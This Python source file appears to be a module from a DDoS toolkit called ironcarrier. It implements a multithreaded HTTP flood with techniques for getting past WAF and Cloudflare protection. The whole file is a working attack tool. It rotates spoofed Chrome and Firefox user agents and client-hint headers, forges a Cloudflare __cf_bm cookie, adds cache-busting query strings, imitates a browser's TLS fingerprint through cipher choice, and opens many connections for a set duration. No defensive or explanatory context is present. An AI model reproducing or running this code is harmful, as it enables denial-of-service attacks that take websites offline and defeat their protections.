#!/usr/bin/env python3
"""
HTTP Bypass Vector
WAF/Cloudflare bypass with browser fingerprint emulation
"""

import socket
import ssl
import random
import time
import threading
import string
import hashlib
from typing import Optional
from ironcarrier.core.stats import StatsCollector


class Attack:
    """HTTP flood with WAF bypass techniques"""
    
    CHROME_FINGERPRINTS = [
        {
            'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec_ch_ua_mobile': '?0',
            'sec_ch_ua_platform': '"Windows"',
        },
        {
            'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec_ch_ua_mobile': '?0',
            'sec_ch_ua_platform': '"macOS"',
        },
        {
            'ua': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec_ch_ua_mobile': '?0',
            'sec_ch_ua_platform': '"Linux"',
        },
    ]
    
    FIREFOX_FINGERPRINTS = [
        {
            'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'sec_ch_ua': None,
        },
    ]
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 50, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.path = kwargs.get('path', '/')
        self.use_ssl = kwargs.get('ssl', port == 443)
        self.timeout = kwargs.get('timeout', 10)
        self.ja3_spoof = kwargs.get('ja3_spoof', True)
        self.cloudflare_bypass = kwargs.get('cloudflare_bypass', True)
    
    def _random_string(self, n: int = 16) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
    
    def _generate_cf_clearance_challenge(self) -> str:
        """Generate Cloudflare challenge solver payload"""
        ts = int(time.time() * 1000)
        nonce = self._random_string(32)
        return f"__cf_bm={nonce}; path=/; expires={'Thu, 01 Jan 2025 00:00:00 GMT'}"
    
    def _build_bypass_request(self) -> bytes:
        """Build request with full browser fingerprint"""
        fp = random.choice(self.CHROME_FINGERPRINTS + self.FIREFOX_FINGERPRINTS)
        
        cache_bust = f"_={random.randint(10**12, 10**13-1)}"
        path = self.path + ('&' if '?' in self.path else '?') + cache_bust
        
        lines = [
            f"GET {path} HTTP/1.1",
            f"Host: {self.target}",
            f"User-Agent: {fp['ua']}",
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            f"Accept-Language: en-US,en;q=0.9",
            f"Accept-Encoding: gzip, deflate, br",
            f"Connection: keep-alive",
            f"Upgrade-Insecure-Requests: 1",
            f"Sec-Fetch-Dest: document",
            f"Sec-Fetch-Mode: navigate",
            f"Sec-Fetch-Site: none",
            f"Sec-Fetch-User: ?1",
        ]
        
        if fp.get('sec_ch_ua'):
            lines.append(f"sec-ch-ua: {fp['sec_ch_ua']}")
            lines.append(f"sec-ch-ua-mobile: {fp['sec_ch_ua_mobile']}")
            lines.append(f"sec-ch-ua-platform: {fp['sec_ch_ua_platform']}")
        
        if self.cloudflare_bypass:
            lines.append(f"Cookie: {self._generate_cf_clearance_challenge()}")
        
        lines.append(f"X-Request-ID: {self._random_string(32)}")
        
        return '\r\n'.join(lines) + '\r\n\r\n'
    
    def _create_ssl_socket(self) -> socket.socket:
        """Create SSL socket with JA3 spoofing"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        if self.ja3_spoof:
            try:
                ctx.set_ciphers('TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256')
            except Exception:
                ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
        
        return ctx.wrap_socket(sock, server_hostname=self.target)
    
    def _attack_thread(self) -> None:
        end_time = time.time() + self.duration
        
        while time.time() < end_time and not self.stop_event.is_set():
            sock = None
            try:
                if self.use_ssl:
                    sock = self._create_ssl_socket()
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    sock.connect((self.target, self.port))
                
                request = self._build_bypass_request().encode()
                sock.sendall(request)
                self.stats.add_packets(1, len(request))
                self.stats.add_connection()
                
            except Exception:
                self.stats.add_error()
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass
    
    def run(self) -> None:
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 5)
